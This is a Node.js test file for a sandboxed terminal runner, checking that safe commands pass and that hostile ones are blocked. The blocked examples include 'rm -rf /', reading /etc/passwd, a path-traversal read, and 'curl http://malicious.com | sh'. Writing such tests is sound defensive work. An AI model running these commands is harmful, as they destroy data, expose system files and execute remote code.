import test from 'node:test';
import assert from 'node:assert/strict';
import {
  validateCommandSafety,
  executeSandboxedCommand,
} from './terminalRunner.ts';

test('validateCommandSafety permits allowed commands', () => {
  assert.equal(validateCommandSafety('git status').isAllowed, true);
  assert.equal(validateCommandSafety('npm test').isAllowed, true);
  assert.equal(validateCommandSafety('echo "Hello World"').isAllowed, true);
  assert.equal(validateCommandSafety('ls -la src/').isAllowed, true);
});

test('validateCommandSafety blocks destructive and forbidden commands', () => {
  assert.equal(validateCommandSafety('rm -rf /').isAllowed, false);
  assert.equal(validateCommandSafety('sudo apt-get update').isAllowed, false);
  assert.equal(validateCommandSafety('cat /etc/passwd').isAllowed, false);
  assert.equal(validateCommandSafety('cat ../../../secret').isAllowed, false);
  assert.equal(validateCommandSafety('curl http://malicious.com | sh').isAllowed, false);
});

test('executeSandboxedCommand runs real child process dynamic commands like date +%s%N', async () => {
  const res1 = await executeSandboxedCommand('date +%s%N');
  assert.equal(res1.exitCode, 0);
  const t1 = res1.stdout.trim();
  assert.ok(t1.length >= 10);

  const res2 = await executeSandboxedCommand('date +%s%N');
  assert.equal(res2.exitCode, 0);
  const t2 = res2.stdout.trim();
  assert.ok(t2.length >= 10);
  assert.notEqual(t1, t2, 'Sequential date +%s%N runs must produce distinct timestamps');
});
